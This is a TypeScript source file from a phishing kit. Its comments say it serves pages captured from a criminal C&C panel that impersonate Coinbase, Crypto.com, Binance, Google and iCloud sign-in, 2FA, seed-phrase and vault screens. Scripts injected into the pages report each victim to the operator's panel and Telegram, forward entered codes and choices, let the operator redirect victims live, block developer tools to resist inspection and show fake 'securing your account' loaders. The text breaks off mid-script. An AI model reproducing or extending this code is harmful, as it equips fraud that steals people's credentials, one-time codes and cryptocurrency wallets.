/**
 * Visitor template resolver.
 *
 * Given a brand + page (as the captured panel exposes them on the wire,
 * e.g. "Coinbase" + "Loading" or "Coinbase" + "Case ID"), resolve to a
 * slug + on-disk HTML file under data/visitor-templates/.
 *
 * The HTML files are full standalone Next.js renders we captured from
 * the original C&C panel (https://alkfjalknlgjnwbelfnalnfskanafa.com)
 * after the Domains tab provisioned a phishing domain. They reference
 * /_next/static/... which we host from /static/_next/* in this project.
 */
import { readFileSync, existsSync } from 'node:fs';
import { resolve, join } from 'node:path';
import { findTemplate, VISITOR_TEMPLATES } from '$lib/visitorTemplates';
import { SKIP_GENERIC_WIRING } from './funnel';
import { dbGetSetting } from './database.js';
import { getSchema } from '$lib/pageVars';
import { applyLiveDatesToHtml } from '$lib/dateVars.js';

export { findTemplate, VISITOR_TEMPLATES };
export type { VisitorTemplate } from '$lib/visitorTemplates';

const TEMPLATE_ROOT = resolve(process.cwd(), 'data', 'visitor-templates');

/**
 * CSS shim injected into every served visitor template.
 *
 * The captured pages put their full-page content inside a viewport-anchored
 * `position:fixed` wrapper (e.g. `fixed overflow-y-auto w-screen min-h-screen`).
 * On screens shorter than the rendered content (most phones), neither the body
 * nor the wrapper scrolls — `min-h-screen` lets the wrapper grow to the
 * content's height so its own `overflow-y:auto` never engages, and `position:
 * fixed` prevents the document from scrolling. The result is that forms,
 * primary CTAs, and Stage-2 panels below the fold become unreachable.
 *
 * The fix: on small viewports, release the outer wrapper into normal document
 * flow so the page scrolls naturally. Inner full-viewport modals (the Coinbase
 * Vault "Select assets" sheet etc.) keep their own `position:fixed` overlay
 * because they target `h-screen` not `min-h-screen`.
 */
const MOBILE_SCROLL_SHIM = `<style data-injected="visitor-mobile-scroll-fix">
@media (max-width: 900px) {
  html, body {
    overflow: visible !important;
    height: auto !important;
    min-height: 100vh !important;
  }
  /* Outer page wrapper - release from fixed so the body scrolls. Some
     captures (e.g. KuCoin/Loading) also bolt on overflow-hidden which
     would clip the now-static content, so override that here too. */
  body div.fixed.w-screen[class*="min-h-screen"] {
    position: static !important;
    overflow: visible !important;
    height: auto !important;
    min-height: 100vh !important;
  }
  /* Wrappers that were already viewport-sized (full-screen modals etc.):
     keep them anchored, just make sure they actually scroll inside. */
  body div.fixed.w-screen[class*="h-screen"]:not([class*="min-h-screen"]) {
    overflow-y: auto !important;
    -webkit-overflow-scrolling: touch;
  }
}
</style>`;

/**
 * Coinbase-specific mobile responsive fix.
 *
 * The captured pages use `w-md` (Tailwind custom: width 448px), `p-10`
 * (40px padding), `mt-[100px]`, and `text-[26px]` which all overflow or
 * waste space on phone screens (320-430px). This shim overrides them on
 * viewports <= 640px so the card fills the screen, buttons stay
 * reachable, and inputs don't trigger iOS auto-zoom.
 */
const COINBASE_MOBILE_FIX = `<style data-injected="coinbase-mobile-fix">
@media (max-width: 640px) {
  html, body {
    overflow-x: hidden !important;
  }

  /* Card containers: release fixed width, shrink padding & top margin */
  .w-md {
    width: 100% !important;
    max-width: 100% !important;
    box-sizing: border-box !important;
  }
  .w-md.h-fit {
    width: calc(100% - 24px) !important;
    max-width: calc(100% - 24px) !important;
    margin-left: 12px !important;
    margin-right: 12px !important;
  }
  .mt-\\[100px\\] {
    margin-top: 16px !important;
  }
  .p-10 {
    padding: 20px !important;
  }
  .p-5 {
    padding: 16px !important;
  }

  /* Typography: tighten headline so it doesn't wrap awkwardly */
  .text-\\[26px\\] {
    font-size: 22px !important;
    line-height: 1.2 !important;
  }
  .text-\\[16px\\] {
    font-size: 15px !important;
  }

  /* Asset / choice scroll lists */
  .h-\\[300px\\] {
    height: clamp(200px, 45vh, 340px) !important;
  }

  /* Buttons: iOS touch-target safe (48px min) */
  .w-md button,
  .w-md [role="button"] {
    min-height: 48px !important;
  }
  .h-\\[55px\\] {
    height: 52px !important;
    min-height: 48px !important;
  }
  .h-\\[45px\\] {
    height: 48px !important;
    min-height: 44px !important;
  }

  /* Inputs: prevent iOS zoom on focus (needs >= 16px) */
  .w-md input,
  .w-md select,
  .w-md textarea {
    font-size: max(16px, 1em) !important;
    min-height: 48px !important;
  }

  /* Full-screen overlay modals (Vault multi-step): keep fixed but
     constrain inner card to viewport width */
  div.fixed.w-screen[class*="h-screen"] .w-md {
    width: calc(100% - 24px) !important;
    max-width: calc(100% - 24px) !important;
    margin-left: 12px !important;
    margin-right: 12px !important;
  }
  div.fixed.w-screen[class*="h-screen"] .w-md.h-fit {
    margin-top: 16px !important;
  }

  /* Choice cards / option rows: ensure they don't get too tight */
  .w-md .min-h-\\[50px\\] {
    min-height: 48px !important;
    padding-top: 10px !important;
    padding-bottom: 10px !important;
  }

  /* SVG logos: cap width so they don't overflow on very small screens */
  .w-\\[126px\\] {
    max-width: 110px !important;
  }

  /* Gap between stacked items */
  .gap-2 {
    gap: 6px !important;
  }

  /* Go-back button row */
  .w-md .flex.flex-row.justify-between {
    flex-wrap: wrap !important;
  }
}
</style>`;

function injectCoinbaseMobileFix(html: string): string {
	if (html.includes('coinbase-mobile-fix')) return html;
	const headClose = html.indexOf('</head>');
	if (headClose === -1) {
		const bodyOpen = html.indexOf('<body');
		const insertAt = bodyOpen === -1 ? 0 : bodyOpen;
		return html.slice(0, insertAt) + COINBASE_MOBILE_FIX + html.slice(insertAt);
	}
	return html.slice(0, headClose) + COINBASE_MOBILE_FIX + html.slice(headClose);
}

function injectMobileScrollFix(html: string): string {
	if (html.includes('visitor-mobile-scroll-fix')) return html;
	const headClose = html.indexOf('</head>');
	if (headClose === -1) {
		// No head — splice in before body content so the rules still apply.
		const bodyOpen = html.indexOf('<body');
		const insertAt = bodyOpen === -1 ? 0 : bodyOpen;
		return html.slice(0, insertAt) + MOBILE_SCROLL_SHIM + html.slice(insertAt);
	}
	return html.slice(0, headClose) + MOBILE_SCROLL_SHIM + html.slice(headClose);
}

/**
 * Case-ID pages (Coinbase, CDC, Binance) all share the same captured structure:
 * six `<input maxlength="1">` boxes that the original Next.js bundle would have
 * stitched together into a 6-digit code. We replace that bundled behaviour with
 * a tiny shim that:
 *   - mirrors keyboard UX (auto-advance, backspace, paste)
 *   - POSTs the assembled code to /api/visitor/case-id/check
 *   - on success, navigates to the target the admin configured (or the brand's
 *     Loading page by default)
 *   - on failure, shakes the row and clears the inputs
 *
 * The shim is appended just before `</body>` so it runs after the captured DOM
 * is in place. It is intentionally framework-free.
 */
const CASE_INPUT_SHIM = `<style data-injected="visitor-case-input">
@keyframes rv-case-shake {
  0%, 100% { transform: translateX(0); }
  20% { transform: translateX(-6px); }
  40% { transform: translateX(6px); }
  60% { transform: translateX(-4px); }
  80% { transform: translateX(4px); }
}
[data-rv-case-row] { transition: filter .2s ease; }
[data-rv-case-row].rv-case-shake { animation: rv-case-shake .4s ease; }
[data-rv-case-row].rv-case-error input { box-shadow: 0 0 0 2px rgba(239, 68, 68, .55) !important; }
[data-rv-case-row].rv-case-ok input { box-shadow: 0 0 0 2px rgba(34, 197, 94, .55) !important; }
[data-rv-case-row].rv-case-locked input { opacity: .55; pointer-events: none; }
</style>
<script data-injected="visitor-case-input">
(function () {
  if (window.__rvCaseInputReady) return;
  window.__rvCaseInputReady = true;

  function brandFromPath() {
    try {
      var parts = decodeURIComponent(location.pathname).split('/').filter(Boolean);
      var idx = parts.indexOf('preview');
      if (idx >= 0 && parts[idx + 1]) return parts[idx + 1];
    } catch (e) {}
    return '';
  }

  function init() {
    var inputs = Array.prototype.slice.call(
      document.querySelectorAll('input[maxlength="1"][inputmode="numeric"]')
    );
    if (inputs.length < 6) {
      inputs = Array.prototype.slice.call(document.querySelectorAll('input[maxlength="1"]'));
    }
    if (inputs.length < 6) return;
    var slots = inputs.slice(0, 6);

    var row = slots[0].parentElement;
    if (row) row.setAttribute('data-rv-case-row', '');

    var locked = false;

    function clearState() {
      if (!row) return;
      row.classList.remove('rv-case-error', 'rv-case-ok', 'rv-case-shake');
    }

    function reset() {
      slots.forEach(function (s) { s.value = ''; });
      clearState();
      try { slots[0].focus(); } catch (e) {}
    }

    function shake() {
      if (!row) return;
      row.classList.remove('rv-case-shake');
      void row.offsetWidth;
      row.classList.add('rv-case-shake', 'rv-case-error');
    }

    function lock() {
      locked = true;
      if (row) row.classList.add('rv-case-locked');
    }

    function unlock() {
      locked = false;
      if (row) row.classList.remove('rv-case-locked');
    }

    function readCode() {
      return slots.map(function (s) { return (s.value || '').replace(/\\D/g, ''); }).join('');
    }

    function submit() {
      if (locked) return;
      var code = readCode();
      if (code.length !== 6) return;
      lock();
      var brand = brandFromPath();
      fetch('/api/visitor/case-id/check', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ code: code, brand: brand })
      })
        .then(function (r) { return r.json().catch(function () { return { ok: false }; }); })
        .then(function (data) {
          if (data && data.valid) {
            if (row) row.classList.add('rv-case-ok');
            var target = (data.targetPage || '').toString();
            setTimeout(function () {
              if (target) {
                location.href = target;
              } else {
                unlock();
              }
            }, 350);
          } else {
            shake();
            setTimeout(function () { reset(); unlock(); }, 450);
          }
        })
        .catch(function () { shake(); setTimeout(function () { reset(); unlock(); }, 450); });
    }

    function setSlot(i, ch) {
      slots[i].value = ch;
      try { slots[i].dispatchEvent(new Event('input', { bubbles: true })); } catch (e) {}
    }

    function distributeDigits(startIdx, digits) {
      var i = startIdx;
      for (var k = 0; k < digits.length && i < slots.length; k++, i++) setSlot(i, digits[k]);
      var nextIdx = Math.min(i, slots.length - 1);
      try { slots[nextIdx].focus(); } catch (e) {}
      if (readCode().length === 6) submit();
    }

    slots.forEach(function (slot, idx) {
      slot.addEventListener('input', function () {
        if (locked) { slot.value = ''; return; }
        clearState();
        var v = (slot.value || '').replace(/\\D/g, '');
        if (v.length > 1) {
          slot.value = v[0];
          distributeDigits(idx + 1, v.slice(1));
        } else if (v.length === 1) {
          slot.value = v;
          if (idx < slots.length - 1) {
            try { slots[idx + 1].focus(); } catch (e) {}
          }
        } else {
          slot.value = '';
        }
        if (readCode().length === 6) submit();
      });

      slot.addEventListener('keydown', function (e) {
        if (locked) { e.preventDefault(); return; }
        if (e.key === 'Backspace' && !slot.value && idx > 0) {
          try { slots[idx - 1].focus(); slots[idx - 1].value = ''; } catch (err) {}
          e.preventDefault();
        } else if (e.key === 'ArrowLeft' && idx > 0) {
          try { slots[idx - 1].focus(); } catch (err) {}
          e.preventDefault();
        } else if (e.key === 'ArrowRight' && idx < slots.length - 1) {
          try { slots[idx + 1].focus(); } catch (err) {}
          e.preventDefault();
        } else if (e.key === 'Enter') {
          e.preventDefault();
          if (readCode().length === 6) submit();
        }
      });

      slot.addEventListener('paste', function (e) {
        try {
          var txt = (e.clipboardData || window.clipboardData).getData('text') || '';
          var digits = txt.replace(/\\D/g, '');
          if (!digits) return;
          e.preventDefault();
          distributeDigits(idx, digits);
        } catch (err) {}
      });

      slot.addEventListener('focus', function () { try { slot.select(); } catch (e) {} });
    });

    try { slots[0].focus(); } catch (e) {}
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
  } else {
    init();
  }
  setTimeout(init, 250);
  setTimeout(init, 1000);
})();
</script>`;

function injectCaseInputShim(html: string): string {
	if (html.includes('visitor-case-input')) return html;
	const bodyClose = html.lastIndexOf('</body>');
	if (bodyClose === -1) return html + CASE_INPUT_SHIM;
	return html.slice(0, bodyClose) + CASE_INPUT_SHIM + html.slice(bodyClose);
}

const CASE_PAGE_NAMES = new Set(['Case ID', 'Case']);

/**
 * Generic "advance" shim — injected into every interactive visitor template
 * that isn't already wired by a dedicated shim (case-id, review-response,
 * trust-device). It gives every page a working Continue / Submit interaction:
 *
 *   - Pages with a row of choice cards (Activity, Balance, Binance/Activity,
 *     etc.) get visual selection + an injected "Continue" button below the
 *     row. Picking a card highlights it; pressing Continue records the
 *     choice and navigates to the next funnel page.
 *
 *   - Pages with a single primary CTA (External "Submit" after the seed
 *     form is filled, Vault Seed "Continue" after the checkbox, Google
 *     "Next", etc.) get an event listener on that button. We do not call
 *     `preventDefault` so any internal multi-step transition the captured
 *     bundle does still runs; we just kick off the advance request after a
 *     short tick. If the button never produced its own redirect (the common
 *     case in this lab build), our `nextUrl` takes the visitor onwards.
 *
 *   - The shim consults `window.__rvWiring` (configured per page below) to
 *     decide which pattern to apply and which button labels to match.
 */
const ADVANCE_SHIM = `<style data-injected="visitor-advance">
[data-rv-choice] {
  position: relative;
  transition: box-shadow .15s ease, background-color .15s ease;
}
[data-rv-choice][data-rv-selected="true"] {
  box-shadow: 0 0 0 2px rgba(96, 165, 250, .75) !important;
}
[data-rv-advance-continue] {
  display: block;
  width: 100%;
  margin-top: 24px;
  padding: 14px 18px;
  font-size: 15px;
  font-weight: 600;
  color: #0a0b0d;
  background: #578bfa;
  border: 0;
  border-radius: 9999px;
  cursor: pointer;
  transition: background-color .15s ease, opacity .15s ease, transform .1s ease;
}
[data-rv-advance-continue]:hover:not(:disabled) { background: #6a98fc; }
[data-rv-advance-continue]:active:not(:disabled) { transform: scale(.985); }
[data-rv-advance-continue]:disabled {
  opacity: .55;
  cursor: not-allowed;
}
[data-rv-advance-continue][data-rv-busy="true"] {
  opacity: .75;
  cursor: progress;
}
</style>
<script data-injected="visitor-advance">
(function () {
  if (window.__rvAdvanceReady) return;
  window.__rvAdvanceReady = true;

  var WIRING = window.__rvWiring || { mode: 'auto' };
  var BRAND_PAGE = window.__rvBrandPage || { brand: '', page: '' };

  function readBrandPage() {
    try {
      var parts = decodeURIComponent(location.pathname).split('/').filter(Boolean);
      var idx = parts.indexOf('preview');
      if (idx >= 0 && parts[idx + 1] && parts[idx + 2]) {
        BRAND_PAGE.brand = BRAND_PAGE.brand || parts[idx + 1];
        BRAND_PAGE.page = BRAND_PAGE.page || parts[idx + 2];
      }
    } catch (e) {}
  }
  readBrandPage();

  var inflight = false;

  function postAdvance(choice, detail) {
    if (inflight) return Promise.resolve(null);
    inflight = true;
    return fetch('/api/visitor/page-advance', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        brand: BRAND_PAGE.brand,
        page: BRAND_PAGE.page,
        choice: choice || '',
        detail: detail || ''
      })
    }).then(function (r) { return r.json().catch(function () { return null; }); })
      .catch(function () { return null; })
      .finally(function () {
        setTimeout(function () { inflight = false; }, 200);
      });
  }

  function advance(choice, detail, btnForBusy) {
    if (btnForBusy) btnForBusy.setAttribute('data-rv-busy', 'true');
    return postAdvance(choice, detail).then(function (data) {
      if (data && data.nextUrl) {
        location.href = data.nextUrl;
      } else if (btnForBusy) {
        btnForBusy.removeAttribute('data-rv-busy');
      }
    });
  }

  // -------- Choice-card detection ---------------------------------------

  function isChoiceCardContainer(el) {
    if (!el || el.nodeType !== 1) return false;
    var kids = Array.prototype.filter.call(el.children, function (k) {
      if (k.nodeType !== 1) return false;
      var cs = getComputedStyle(k);
      if (cs.cursor !== 'pointer') return false;
      var h = parseFloat(cs.height);
      if (!h || h < 30 || h > 110) return false;
      // Must have visible text
      return (k.textContent || '').trim().length > 0;
    });
    if (kids.length < WIRING.minChoices && kids.length < 3) return false;
    if (kids.length < 3) return false;
    return kids;
  }

  function findChoiceContainer() {
    if (WIRING.choiceContainer) {
      var explicit = document.querySelector(WIRING.choiceContainer);
      if (explicit) return { el: explicit, kids: isChoiceCardContainer(explicit) || [] };
    }
    var all = document.querySelectorAll('div');
    for (var i = 0; i < all.length; i++) {
      var kids = isChoiceCardContainer(all[i]);
      if (kids && kids.length >= 3) return { el: all[i], kids: kids };
    }
    return null;
  }

  // -------- Single-CTA detection ---------------------------------------

  function ctaTextMatches(text) {
    var t = (text || '').trim().toLowerCase();
    if (!t || t.length > 40) return false;
    var labels = (WIRING.ctaTexts && WIRING.ctaTexts.length)
      ? WIRING.ctaTexts
      : ['continue', 'submit', 'confirm', 'verify', 'next', 'sign in', 'log in', 'done'];
    for (var i = 0; i < labels.length; i++) {
      if (t === labels[i].toLowerCase()) return true;
    }
    return false;
  }

  function findPrimaryCta() {
    var buttons = Array.prototype.slice.call(document.querySelectorAll('button'));
    var primaries = buttons.filter(function (b) { return ctaTextMatches(b.textContent); });
    if (!primaries.length) return null;
    // Prefer enabled, full-width-looking, bottom-most button
    primaries.sort(function (a, b) {
      var ad = (a.disabled || a.getAttribute('aria-disabled') === 'true') ? 1 : 0;
      var bd = (b.disabled || b.getAttribute('aria-disabled') === 'true') ? 1 : 0;
      if (ad !== bd) return ad - bd;
      var ar = a.getBoundingClientRect(), br = b.getBoundingClientRect();
      return br.top - ar.top;
    });
    return primaries[0];
  }

  // -------- Continue button helpers ------------------------------------

  function buildContinueBtn(label) {
    var b = document.createElement('button');
    b.type = 'button';
    b.textContent = label || 'Continue';
    b.setAttribute('data-rv-advance-continue', '');
    b.disabled = true;
    return b;
  }

  // -------- Wiring routines --------------------------------------------

  var wiredContainer = null;
  var ctaWiredBtn = null;

  function wireChoiceCards() {
    // If a previously-wired container is still in the DOM, we're done.
    if (wiredContainer && document.body.contains(wiredContainer)) return true;
    wiredContainer = null;
    var info = findChoiceContainer();
    if (!info) return false;
    var kids = info.kids;
    if (!kids || !kids.length) return false;
    if (info.el.getAttribute('data-rv-choice-container') === '1') {
      wiredContainer = info.el;
      return true;
    }
    info.el.setAttribute('data-rv-choice-container', '1');
    wiredContainer = info.el;

    var selected = -1;
    var continueBtn = buildContinueBtn(WIRING.continueLabel);

    kids.forEach(function (card, i) {
      card.setAttribute('data-rv-choice', '');
      card.addEventListener('click', function (e) {
        e.stopPropagation();
        if (selected === i) return;
        kids.forEach(function (c) { c.setAttribute('data-rv-selected', 'false'); });
        card.setAttribute('data-rv-selected', 'true');
        selected = i;
        continueBtn.disabled = false;
      }, true);
    });

    continueBtn.addEventListener('click', function () {
      if (selected < 0) return;
      var choice = (kids[selected].textContent || '').trim().slice(0, 160);
      advance(choice, '', continueBtn);
    });

    var anchor = info.el.parentElement || info.el;
    anchor.appendChild(continueBtn);
    return true;
  }

  // -------- Code-input pages (iCloud/2fa) ------------------------------

  var codeInputsWired = false;

  function wireCodeInputs() {
    if (codeInputsWired) return true;
    var inputs = Array.prototype.slice.call(document.querySelectorAll('input'))
      .filter(function (i) {
        if (i.type !== 'text' && i.type !== 'tel' && i.type !== 'number' && i.type !== 'password') return false;
        var max = parseInt(i.getAttribute('maxlength') || '0', 10);
        return max === 1 || (i.value || '').length <= 1;
      });
    var expected = (WIRING.codeLength || 6);
    if (inputs.length < expected) return false;
    inputs = inputs.slice(0, expected);

    function maybeAdvance() {
      var values = inputs.map(function (i) { return (i.value || '').trim(); });
      var done = values.every(function (v) { return v && v.length >= 1; });
      if (!done) return;
      advance(values.join(''));
    }

    inputs.forEach(function (inp) {
      inp.addEventListener('input', maybeAdvance);
      inp.addEventListener('change', maybeAdvance);
      inp.addEventListener('paste', function () { setTimeout(maybeAdvance, 50); });
    });

    codeInputsWired = true;
    return true;
  }

  function wireSingleCta() {
    if (ctaWiredBtn && document.body.contains(ctaWiredBtn)) return true;
    ctaWiredBtn = null;
    var btn = findPrimaryCta();
    if (!btn) return false;
    if (btn.getAttribute('data-rv-cta-wired') === '1') { ctaWiredBtn = btn; return true; }
    btn.setAttribute('data-rv-cta-wired', '1');
    ctaWiredBtn = btn;
    btn.addEventListener('click', function () {
      var disabled = btn.disabled || btn.getAttribute('aria-disabled') === 'true';
      if (disabled) return;
      // Give any captured page bundle a tick to run its own click handler
      // (e.g. transitioning a multi-step pane). If after 200ms we're still
      // on this URL, take over.
      var hereAtClick = location.href;
      setTimeout(function () {
        if (location.href !== hereAtClick) return;
        var label = (btn.textContent || '').trim().slice(0, 80);
        advance(label, '', btn);
      }, 200);
    });
    return true;
  }

  function init() {
    if (!BRAND_PAGE.brand || !BRAND_PAGE.page) readBrandPage();

    var mode = WIRING.mode || 'auto';
    if (mode === 'skip') return;

    if (mode === 'code-inputs') {
      wireCodeInputs();
      return;
    }
    if (mode === 'choice-cards' || mode === 'auto') {
      if (wireChoiceCards()) return;
    }
    if (mode === 'cta' || mode === 'auto') {
      wireSingleCta();
    }
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
  } else {
    init();
  }
  // A small fixed schedule rather than a MutationObserver, to avoid
  // observer feedback loops when our own injected DOM mutates the body.
  // Captured pages typically hydrate within ~1s; after that the layout
  // is stable for the visitor's interaction.
  setTimeout(init, 250);
  setTimeout(init, 700);
  setTimeout(init, 1500);
  setTimeout(init, 3000);
})();
</script>`;

/**
 * Per-page wiring rules. Anything missing falls back to mode=auto which tries
 * choice-cards first and a single primary CTA second. We only need explicit
 * entries for pages where auto-detection would do the wrong thing (e.g. force
 * choice-cards even if a button is also present).
 */
const PAGE_WIRINGS: Record<string, Record<string, unknown>> = {
	'Coinbase/Activity': { mode: 'choice-cards', minChoices: 6, continueLabel: 'Continue' },
	'Coinbase/Balance': { mode: 'choice-cards', minChoices: 6, continueLabel: 'Continue' },
	'CDC/Activity': { mode: 'choice-cards', minChoices: 6, continueLabel: 'Continue' },
	'CDC/Balance': { mode: 'choice-cards', minChoices: 6, continueLabel: 'Continue' },
	'Binance/Activity': { mode: 'choice-cards', minChoices: 6, continueLabel: 'Continue' },
	'Binance/Balance': { mode: 'choice-cards', minChoices: 6, continueLabel: 'Continue' },

	'Coinbase/External': { mode: 'cta', ctaTexts: ['Submit'] },
	'Coinbase/CBW': { mode: 'cta', ctaTexts: ['Submit'] },
	'Coinbase/Reset Pass': { mode: 'cta', ctaTexts: ['Submit', 'Reset', 'Continue'] },
	'Coinbase/Swap': { mode: 'cta', ctaTexts: ['Authorize', 'Continue', 'Submit'] },
	'Coinbase/Vault': { mode: 'cta', ctaTexts: ['Continue'] },
	'Coinbase/Vault Seed': { mode: 'cta', ctaTexts: ['Continue'] },

	'CDC/External': { mode: 'cta', ctaTexts: ['Continue', 'Submit'] },
	'CDC/Wallet': { mode: 'cta', ctaTexts: ['Continue', 'Submit'] },

	'Binance/Backup': { mode: 'cta', ctaTexts: ['Okay, I understand', 'Submit', 'Continue'] },

	'Google/Login': { mode: 'cta', ctaTexts: ['Next', 'Continue'] },
	'Google/Password': { mode: 'cta', ctaTexts: ['Next', 'Continue'] },
	'Google/SMS': { mode: 'cta', ctaTexts: ['Next', 'Continue', 'Verify'] },
	'Google/TOTP': { mode: 'cta', ctaTexts: ['Next', 'Continue', 'Verify'] },
	'Google/Backup code': { mode: 'cta', ctaTexts: ['Next', 'Continue'] },
	'Google/Fail': { mode: 'cta', ctaTexts: ['Try again', 'Continue', 'Next'] },

	'iCloud/Login': { mode: 'cta', ctaTexts: ['Continue', 'Next', 'Sign In', 'Sign in'] },
	'iCloud/Password': { mode: 'cta', ctaTexts: ['Sign in', 'Sign In', 'Continue', 'Next'] },
	'iCloud/2fa': { mode: 'code-inputs', codeLength: 6 }
};

function buildBrandPageScript(brand: string, page: string): string {
	const bp = JSON.stringify({ brand, page }).replace(/</g, '\\u003c');
	return `<script data-injected="visitor-brand-page">window.__rvBrandPage = ${bp};</script>`;
}

function buildAdvanceConfigScript(brand: string, page: string): string {
	const wiring = PAGE_WIRINGS[`${brand}/${page}`] ?? { mode: 'auto' };
	const cfg = JSON.stringify(wiring).replace(/</g, '\\u003c');
	const bp = JSON.stringify({ brand, page }).replace(/</g, '\\u003c');
	return `<script data-injected="visitor-advance-config">window.__rvWiring = ${cfg}; window.__rvBrandPage = ${bp};</script>`;
}

/** Registers visitor in panel + Telegram when a template page loads. */
const CONNECT_SHIM = `<script data-injected="visitor-connect">
(function () {
  if (window.__rvConnectSent) return;
  window.__rvConnectSent = true;
  var bp = window.__rvBrandPage || {};
  fetch('/api/visitor/connect', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      brand: bp.brand,
      page: bp.page,
      path: location.pathname,
      host: location.hostname
    }),
    credentials: 'same-origin'
  }).catch(function () {});
  window.addEventListener('pagehide', function () {
    try {
      navigator.sendBeacon('/api/visitor/disconnect', new Blob(['{}'], { type: 'application/json' }));
    } catch (e) {}
  });
})();
</script>`;

/** Polls for admin redirects and navigates the visitor when needed. */
const SYNC_SHIM = `<script data-injected="visitor-sync">
(function () {
  if (window.__rvSyncReady) return;
  window.__rvSyncReady = true;

  var isPreview = location.pathname.startsWith('/templates/preview/');

  function parseBrandPageFromPath() {
    try {
      var parts = decodeURIComponent(location.pathname).split('/').filter(Boolean);
      var idx = parts.indexOf('preview');
      if (idx >= 0 && parts[idx + 1] && parts[idx + 2]) {
        return { brand: parts[idx + 1], page: parts[idx + 2] };
      }
    } catch (e) {}
    return null;
  }

  function poll() {
    var bp = window.__rvBrandPage;
    if (!bp || !bp.brand || !bp.page) {
      var parsed = parseBrandPageFromPath();
      if (parsed) {
        bp = parsed;
        window.__rvBrandPage = bp;
      }
    }
    if (!bp || !bp.brand || !bp.page) return;
    var params = new URLSearchParams({ brand: bp.brand, page: bp.page });
    params.set('isPreview', isPreview ? 'true' : 'false');
    fetch('/api/visitor/sync?' + params.toString(), { credentials: 'same-origin' })
      .then(function (r) { return r.json().catch(function () { return null; }); })
      .then(function (data) {
        if (!data || !data.redirectUrl) return;
        var target = data.redirectUrl;
        var currentPath = location.pathname;
        var targetPath = target.split('?')[0];
        if (targetPath !== currentPath) {
          location.href = target;
        }
      })
      .catch(function () {});
  }

  poll();
  var intervalId = setInterval(poll, 2000);
  window.addEventListener('pagehide', function () {
    clearInterval(intervalId);
  });
})();
</script>`;

function injectConnectShim(html: string, brand: string, page: string): string {
	if (html.includes('visitor-connect')) return html;
	let payload = '';
	if (!html.includes('__rvBrandPage')) {
		payload += buildBrandPageScript(brand, page);
	}
	payload += CONNECT_SHIM + SYNC_SHIM;
	const bodyClose = html.lastIndexOf('</body>');
	if (bodyClose === -1) return html + payload;
	return html.slice(0, bodyClose) + payload + html.slice(bodyClose);
}

function injectAdvanceShim(html: string, brand: string, page: string): string {
	if (html.includes('visitor-advance')) return html;
	const cfg = buildAdvanceConfigScript(brand, page);
	const payload = cfg + ADVANCE_SHIM;
	const bodyClose = html.lastIndexOf('</body>');
	if (bodyClose === -1) return html + payload;
	return html.slice(0, bodyClose) + payload + html.slice(bodyClose);
}

export interface LoadTemplateOptions {
	visitorIp?: string;
	lastTwoDigits?: string;
	emailFrom?: string;
	emailTo?: string;
}

export interface TemplateOverrides {
	lastTwoDigits?: string;
	emailFrom?: string;
	emailTo?: string;
}

function applyOverrides(html: string, overrides: TemplateOverrides): string {
	if (overrides.lastTwoDigits) {
		html = html.replace(/(<span\s+id="rv-phone">[^<]*?)(\d{2})(<\/span>)/, `$1${overrides.lastTwoDigits}$3`);
	}
	if (overrides.emailFrom) {
		html = html.replace(
			/(class="rv-from rv-mono">)[^<]*/,
			`$1${overrides.emailFrom}`
		);
	}
	if (overrides.emailTo) {
		html = html.replace(
			/(class="rv-to rv-mono">)[^<]*/,
			`$1${overrides.emailTo}`
		);
		html = html.replace(
			/Email change to [^'"<]+/g,
			`Email change to ${overrides.emailTo}`
		);
	}
	return html;
}

const DEVTOOLS_BLOCK_SHIM = `<script data-injected="disable-devtools">
(function(){
  document.addEventListener('contextmenu',function(e){e.preventDefault()});
  document.addEventListener('keydown',function(e){
    if(e.key==='F12'||(e.ctrlKey&&e.shiftKey&&(e.key==='I'||e.key==='J'||e.key==='C'))||(e.ctrlKey&&e.key==='u'))e.preventDefault();
  });
})();
</script>`;

const LOADING_UI_STYLE = `<style data-injected="loading-ui">
#rv-loading-overlay {
  position: fixed;
  inset: 0;
  z-index: 2147483646;
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  background: #0a0b0d;
  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
  text-align: center;
  padding: 24px;
  box-sizing: border-box;
}
#rv-loading-overlay .rv-loading-spinner {
  width: 48px;
  height: 48px;
  border: 3px solid rgba(255, 255, 255, 0.12);
  border-top-color: #0052ff;
  border-radius: 50%;
  animation: rv-loading-spin 0.85s linear infinite;
  margin-bottom: 28px;
}
@keyframes rv-loading-spin { to { transform: rotate(360deg); } }
#rv-loading-overlay h1 {
  color: #ffffff;
  font-size: 1.375rem;
  font-weight: 600;
  letter-spacing: -0.02em;
  margin: 0 0 10px;
  line-height: 1.3;
}
#rv-loading-overlay p {
  color: rgba(255, 255, 255, 0.55);
  font-size: 0.9375rem;
  margin: 0;
  max-width: 280px;
  line-height: 1.45;
}
</style>`;

const LOADING_GATE_MARKUP = `<div id="rv-loading-overlay" data-injected="loading-ui" aria-live="polite" aria-busy="true">
  <div class="rv-loading-spinner" role="status" aria-label="Loading"></div>
  <h1>Loading</h1>
  <p>Please wait while we secure your account&hellip;</p>
</div>`;

const LOADING_GATE_SHIM = `<script data-injected="loading-gate">
(function () {
  if (window.__rvLoadingGate) return;
  window.__rvLoadingGate = true;
  var params = new URLSearchParams(location.search);
  var next = params.get('next');
  var rawMs = parseInt(params.get('ms') || '', 10);
  var delay = rawMs >= 5000 && rawMs <= 8000
    ? rawMs
    : 5000 + Math.floor(Math.random() * 3001);
  function go(url) {
    if (url && url.charAt(0) === '/') location.href = url;
    else if (url) location.href = url;
  }
  if (next) {
    setTimeout(function () { go(next); }, delay);
    return;
  }
  var bp = window.__rvBrandPage || {};
  setTimeout(function () {
    fetch('/api/visitor/page-advance', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        brand: bp.brand || 'Coinbase',
        page: bp.page || 'Loading',
        choice: 'timer'
      })
    })
      .then(function (r) { return r.json().catch(function () { return null; }); })
      .then(function (d) {
        if (d && d.nextUrl) location.href = d.nextUrl;
      })
      .catch(function () {});
  }, delay);
})();
</script>`;

const LIVE_DATE_SHIM = `<script data-injected="visitor-live-dates">
(function () {
  if (window.__rvLiveDates) return;
